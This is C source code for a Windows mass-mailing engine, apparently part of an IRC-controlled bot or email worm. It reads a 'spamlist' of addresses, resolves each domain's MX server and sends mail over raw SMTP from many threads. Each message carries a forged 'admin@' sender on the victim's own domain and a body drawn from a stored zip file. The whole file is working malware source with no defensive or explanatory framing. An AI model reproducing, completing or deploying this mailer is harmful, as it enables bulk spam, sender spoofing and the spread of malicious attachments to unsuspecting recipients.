   #include <windows.h>
   #include <stdio.h>
   #include <winsock.h>

   #include "base64.c"

   #define MAX_THREADS 256
   #define xfer(m) send(s, m, strlen(m), 0);
   #define THREAD_TTL 120*1000 /* msec */

   int myWait(SOCKET);
   DWORD WINAPI mx_thread(DWORD);
   int mx_get_free_cell(void);
   int mx_get_email(FILE *,char *);
   int send_mess(int);
   int threads_kill_test(void);

   struct mx_threads_{
       char szDomain[256];
       char szFrom[256];
       char szTo[256];
       char szTo2[512];
       HANDLE hThread;
       DWORD dwThreadId;
       DWORD dwStartTime;
       int index;
       BOOL fBusy;
       char szMx[256];
       SOCKET s;
       SOCKET s2;
   };

   struct mx_engine_{
       int nThreadsActive;
       int nThreadsMax;
       BOOL fFinished;
       FILE *fp;
       char szSpamlist[256];
       char *message;
       DWORD message_length;
       unsigned int messages_sent;
   };

   struct mx_threads_ mx_threads[MAX_THREADS];
   struct mx_engine_ mx_engine;

   /*int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR szCmdLine, int nCmdShow){

       ZeroMemory(&mx_threads,sizeof(mx_threads));

       mx_engine.nThreadsMax = atoi(irc_node.param_list[2]);
       strncpy(mx_engine.szSpamlist,irc_node.param_list[0],255);
       init_spam(irc_node.param_list[1]);

       mx_engine.nThreadsActive = 0;
       mx_engine.messages_sent = 0;
       mx_engine.fFinished = FALSE;
           mx_engine.fp = fopen(mx_engine.szSpamlist, "r");
       if(!mx_engine.fp) return 1;

       for(int i=0;i<mx_engine.nThreadsMax;i++){
           mx_threads[i].fBusy = FALSE;
       }

       while((mx_engine.nThreadsActive) || (mx_engine.fFinished==FALSE))
       {
           if(mx_engine.nThreadsActive<mx_engine.nThreadsMax){
               int nIndex = mx_get_free_cell();
               if(nIndex == -1){
                   //printf("Threads collision :-(\n");
                   return 1;
               }

               mx_threads[nIndex].index = nIndex;

               if(mx_get_email(mx_threads[nIndex].szTo)==0){
                   char *domain = strchr(mx_threads[nIndex].szTo,'@');
                   if(domain){
                       domain++;
                       strncpy(mx_threads[nIndex].szDomain,domain,255);
                       mx_threads[nIndex].fBusy = TRUE;
                       mx_threads[nIndex].dwStartTime = GetTickCount();
                       mx_engine.nThreadsActive++;
                       mx_threads[nIndex].hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)mx_thread,(void *)nIndex,0,&mx_threads[nIndex].dwThreadId);
                   }
               }
           } else {
               //printf("Threads active %d\n",mx_engine.nThreadsActive);
               threads_kill_test();
               Sleep(500);
           }
       }

       fclose(mx_engine.fp);
       WSACleanup();
       shutdown_spam();
       return 0;
   }*/

   int mx_get_free_cell(void){
       for(int i=0;i<mx_engine.nThreadsMax;i++){
           if(mx_threads[i].fBusy == FALSE){
               return i;
           }
       }
       return -1;
   }

   DWORD WINAPI mx_thread(DWORD index){
       int retval = 0;
       Sleep(1000);

       strncpy(mx_threads[index].szFrom,"admin@",255);
       strncat(mx_threads[index].szFrom,mx_threads[index].szDomain,245);
       strncpy(mx_threads[index].szTo2,mx_threads[index].szTo,255);
       char *alpha = strchr(mx_threads[index].szTo2,'@');
       if(alpha) { *alpha = 0x20; alpha++; *alpha = 0; }
       mx_threads[index].szTo2[0] &= 0xDF;
       strncat(mx_threads[index].szTo2,"<",255);
       strncat(mx_threads[index].szTo2,mx_threads[index].szTo,255);
       strncat(mx_threads[index].szTo2,">",255);
       mx_threads[index].szMx[0] = 0;

       if(!get_mx(mx_threads[index].szDomain,mx_threads[index].szMx,2000,index)){
           if(strlen(mx_threads[index].szMx)>0){
               /*printf("Thread %d, To: '%s', Domain: '%s', To2: '%s', Mx: '%s'\n",index, \
                 mx_threads[index].szTo,mx_threads[index].szDomain,mx_threads[index].szTo2,\
                 mx_threads[index].szMx);*/
               if(!send_mess(index)){
                   mx_engine.messages_sent++;
               } else { retval = 1; }
           } else {
               //printf("mx not found\n");
               retval = 1;
           }
       } else { retval = 1; }

       mx_threads[index].fBusy = FALSE;
       mx_engine.nThreadsActive--;
       return retval;
   }

   int send_mess(int nIndex){

       char buf[4096];
       SOCKET s = 0;
       long dstaddr;

       struct hostent *he = gethostbyname(mx_threads[nIndex].szMx);
       if(!he){
           //printf("hostent() error: %d\n",WSAGetLastError());
           return 1;
       }

       SOCKADDR_IN anAddr;
       s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
       mx_threads[nIndex].s = s;

       if(s!=INVALID_SOCKET){
           dstaddr = *((long*)he->h_addr_list[0]);

           anAddr.sin_family = AF_INET;
           anAddr.sin_port = htons(25);
           anAddr.sin_addr.S_un.S_addr = dstaddr;

           if(connect(s, (struct sockaddr *)&anAddr, sizeof(struct sockaddr)) == 0) {
               myWait(s);
               xfer("HELO localhost\r\n");
               if(myWait(s)) { closesocket(s); return 1; }

               sprintf(buf,"MAIL FROM:<%s>\r\n",mx_threads[nIndex].szFrom);
               send(s, buf, strlen(buf), 0);
               if(myWait(s)) { closesocket(s); return 1; }

               sprintf(buf,"RCPT TO:<%s>\r\n",mx_threads[nIndex].szTo);
               send(s, buf, strlen(buf), 0);
               if(myWait(s)) { closesocket(s); return 1; }

               xfer("DATA\r\n");
               if(myWait(s)) { closesocket(s); return 1; }

               sprintf(buf,"From: %s\nTo: %s\nReply-To: %s\n",mx_threads[nIndex].szFrom,\
                   mx_threads[nIndex].szTo2,mx_threads[nIndex].szFrom);
               send(s, buf, strlen(buf), 0);

               char *msg = get_message_body(storage.szZipFile);
               if(msg) {
                   char *pByte = msg;
                   for(int i=0;i<strlen(msg);i++){
                       send(s,pByte,1,0);
                       pByte++;
                   }
                   free(msg);
               }

               xfer("\r\n.\r\n");
               if(myWait(s)) { closesocket(s); return 1; }
               xfer("QUIT\r\n");
               if(myWait(s)) { closesocket(s); return 1; }

           } /* else {
               printf("Failed to connect: '%s'\n",mx_threads[nIndex].szMx);
           } */
       }
       closesocket(s);
       mx_threads[nIndex].s = 0;
       return 0;
   }

   int threads_kill_test(void){
       for(int j = 0; j < mx_engine.nThreadsMax; j++){
           if(mx_threads[j].fBusy == TRUE){
               int elapsed = GetTickCount() - mx_threads[j].dwStartTime;
               if(elapsed>THREAD_TTL && mx_threads[j].hThread != 0){

                   //printf("Kill this fuckin thread %d\n",mx_threads[j].hThread);

                   TerminateThread(mx_threads[j].hThread,0);
                   if(mx_threads[j].s && mx_threads[j].s != INVALID_SOCKET)
                       closesocket(mx_threads[j].s);
                   if(mx_threads[j].s2 && mx_threads[j].s2 != INVALID_SOCKET)
                       closesocket(mx_threads[j].s);

                   mx_threads[j].hThread = 0;
                   mx_threads[j].fBusy = FALSE;
                   mx_engine.nThreadsActive--;
               }
           }
       }
       return 0;
   }

   int myWait(SOCKET s){
       FD_SET test;
       TIMEVAL myTime;
       int canRead;
       char buf3[1024] = { 0 };
       int i = 0;
       int j = 0;
       char *p1 = buf3;
       test.fd_count = 1;
       test.fd_array[0] = s;
       myTime.tv_sec = 3;
       myTime.tv_usec = 0;

       do {
           j = recv(s,p1,1,0);
           canRead = select(0, &test, NULL, NULL, &myTime);

           p1++; i++;
       } while(j!=0 && canRead);
       *p1 = 0;

       //printf("%s",buf3);

       if(strncmp(buf3,"250",3)==0 || strncmp(buf3,"220",3)==0 ||
           strncmp(buf3,"354",3)==0 || strncmp(buf3,"221",3)==0){
           return 0;
       }

       //printf("ERROR! %s\n",buf3);
       return 1;
   }
